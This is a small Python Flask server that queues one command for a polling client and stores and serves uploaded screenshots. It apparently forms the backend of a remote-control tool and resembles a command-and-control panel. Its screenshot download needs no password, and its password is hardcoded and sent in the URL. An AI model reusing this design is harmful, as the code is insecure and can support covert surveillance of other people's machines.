from flask import Flask, request, jsonify, render_template, send_file
import os

app = Flask(__name__)

PASSWORD = "mysecretpass"  # Change this
current_command = {}       # Shared in memory

@app.route("/")
def dashboard():
    return render_template("dashboard.html")

@app.route("/get_command")
def get_command():
    if request.args.get("pass") != PASSWORD:
        return "Unauthorized", 401
    global current_command
    cmd = current_command
    current_command = {}
    return jsonify(cmd)

@app.route("/add_command", methods=["POST"])
def add_command():
    if request.args.get("pass") != PASSWORD:
        return "Unauthorized", 401
    global current_command
    current_command = request.json
    return "OK"

@app.route("/upload_screenshot", methods=["POST"])
def upload_screenshot():
    if request.args.get("pass") != PASSWORD:
        return "Unauthorized", 401
    file = request.files['file']
    file.save("latest.jpg")
    return "Uploaded"

@app.route("/get_screenshot")
def get_screenshot():
    return send_file("latest.jpg", mimetype='image/jpeg')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)